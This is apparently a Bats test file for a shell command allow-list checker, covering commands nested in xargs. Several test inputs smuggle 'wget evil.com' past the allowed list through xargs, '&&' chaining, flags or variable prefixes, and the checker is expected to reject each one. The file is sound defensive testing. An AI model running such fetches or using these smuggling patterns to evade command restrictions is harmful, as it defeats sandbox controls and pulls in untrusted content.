# xargs {{{
@test "allowed command nested in xargs" {
  run command-in-list "find . | xargs grep foo" -- "find" "grep"
  [ $status -eq 0 ]
}
@test "forbidden command nested in xargs" {
  run command-in-list "find . | xargs wget evil.com" -- "find"
  [ $status -eq 1 ]
}
@test "forbidden command in long form  xargs" {
  run command-in-list "find . | xargs 'echo ok && wget evil.com'" -- "find" "echo"
  [ $status -eq 1 ]
}
@test "xargs with flags" {
  run command-in-list "xargs -n 10 wget evil.com && echo yes" -- "echo"
  [ $status -eq 1 ]
}
@test "xargs without arguments" {
  run command-in-list "find . | xargs" -- "find"
  [ $status -eq 0 ]
}
@test "xargs with multiple flags and complex command" {
  run command-in-list "find . | xargs -I {} -n 1 'echo {} && wget evil.com'" -- "find" "echo"
  [ $status -eq 1 ]
}
@test "variable definition before xargs" {
  run command-in-list "FOO=bar xargs wget evil.com" -- "echo"
  [ $status -eq 1 ]
}
@test "chained xargs with forbidden command" {
  run command-in-list "find . | xargs grep foo | xargs wget evil" -- "find" "grep"
  [ $status -eq 1 ]
}
# }}}
